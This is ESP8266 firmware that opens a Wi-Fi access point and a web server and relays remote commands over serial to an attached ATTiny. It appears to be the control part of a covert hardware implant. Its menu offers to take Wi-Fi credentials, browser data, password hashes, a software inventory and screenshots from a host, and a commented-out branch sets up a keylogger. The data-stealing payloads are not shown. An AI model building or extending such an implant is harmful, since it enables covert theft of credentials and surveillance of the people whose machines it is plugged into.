// Code to flash ESP 8266 for setting up WIFI and web server. The code also instantiates software serialization and the output from the connected device via phone/laptop is sent on the D5 pin.

#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <SoftwareSerial.h>

// Use D5 (GPIO14) for TX only
SoftwareSerial toATTiny(-1, 14); // RX=-1 (unused), TX=14 

// Web server config
ESP8266WebServer server(80);
const int ledPin = LED_BUILTIN;

void handleRoot() {
  server.send(200, "text/html",
    "<h1>ESP8266 Controller</h1>"
    "<p>Send commands to /run?cmd=a</p>"
    "<br><h2>Commands</h2><br>"
    "r → A SURPRISE<br>"
    "w → WIFI<br>"
    "b → Browser<br>"
    "h → Hashes<br>"
    "i → Installed Softwares<br>"
    "s → Screenshot<br>"
  );
}

void handleRun() {
  if(server.hasArg("cmd") && server.arg("cmd") == "r") {
    digitalWrite(ledPin, LOW);
    
    toATTiny.write("r");
    toATTiny.flush();
    
    server.send(200, "text/plain", "Sent: r");
    digitalWrite(ledPin, HIGH);
    return;
  // } else if(server.hasArg("cmd") && server.arg("cmd") == "c") {
  //   digitalWrite(ledPin, LOW);
  //   toATTiny.write("c"); // Use write() instead of print()
  //   toATTiny.flush();          // Ensure complete transmission
    
  //   server.send(200, "text/plain", "Sent: b");
  //   digitalWrite(ledPin, HIGH);
  //   return;
  } else if(server.hasArg("cmd") && server.arg("cmd") == "w") {
    digitalWrite(ledPin, LOW);
    toATTiny.write("w");
    toATTiny.flush();
    
    server.send(200, "text/plain", "Sent: w");
    digitalWrite(ledPin, HIGH);
    return;
  }
  else if(server.hasArg("cmd") && server.arg("cmd") == "b") {
    digitalWrite(ledPin, LOW);
    toATTiny.write("b");
    toATTiny.flush();
    
    server.send(200, "text/plain", "Sent: b");
    digitalWrite(ledPin, HIGH);
    return;
  }
  else if(server.hasArg("cmd") && server.arg("cmd") == "h") {
    digitalWrite(ledPin, LOW);
    toATTiny.write("h");
    toATTiny.flush();
    
    server.send(200, "text/plain", "Sent: h");
    digitalWrite(ledPin, HIGH);
    return;
  }
  else if(server.hasArg("cmd") && server.arg("cmd") == "i") {
    digitalWrite(ledPin, LOW);
    toATTiny.write("i");
    toATTiny.flush();
    
    server.send(200, "text/plain", "Sent: i");
    digitalWrite(ledPin, HIGH);
    return;
  }
  else if(server.hasArg("cmd") && server.arg("cmd") == "s") {
    digitalWrite(ledPin, LOW);
    toATTiny.write("s");
    toATTiny.flush();
    
    server.send(200, "text/plain", "Sent: s");
    digitalWrite(ledPin, HIGH);
    return;
  }
  // else if(server.hasArg("cmd") && server.arg("cmd") == "k") { // Setting up keylogger
  //   digitalWrite(ledPin, LOW);
  //   toATTiny.write("k"); // Use write() instead of print()
  //   toATTiny.flush();          // Ensure complete transmission
    
  //   server.send(200, "text/plain", "Sent: b");
  //   digitalWrite(ledPin, HIGH);
  //   return;
  // }
  server.send(400, "text/plain", "Invalid command");
}

void setup() {
  pinMode(ledPin, OUTPUT);
  digitalWrite(ledPin, HIGH);
  
  toATTiny.begin(9600);
  Serial.begin(115200);

  // WiFi Setup
  WiFi.persistent(false);
  WiFi.mode(WIFI_OFF);
  delay(100);
  WiFi.mode(WIFI_AP);
  
  IPAddress apIP(192, 168, 4, 1);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("HBF-DA-BEST", "YesItIs");

  server.on("/", handleRoot);
  server.on("/run", handleRun);
  server.begin();
}

void loop() {
  server.handleClient();
}
